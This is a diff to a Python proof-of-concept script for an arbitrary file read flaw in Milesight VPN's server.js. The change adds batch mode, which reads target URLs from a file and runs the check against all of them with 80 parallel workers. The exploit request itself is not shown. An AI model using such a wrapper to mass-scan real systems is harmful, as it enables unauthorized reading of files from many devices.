@@ -23,12 +23,23 @@ def banner():
 def main():
     banner()
     parser = argparse.ArgumentParser(description='Milesight VPN server.js 任意文件读取漏洞')
-    parser.add_argument('-url','--url',dest='url',type=str,help='input your url')
+    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
+    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
     args = parser.parse_args()
-    if args.url:
-        poc()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list =[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip())
+        pool = Pool(80)
+        pool.map(poc,url_list)
+        pool.close()
+        pool.join()
     else:
-        print(f'Usage:\n\t python3 {sys.argv[0]}-h')
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
     
 
 
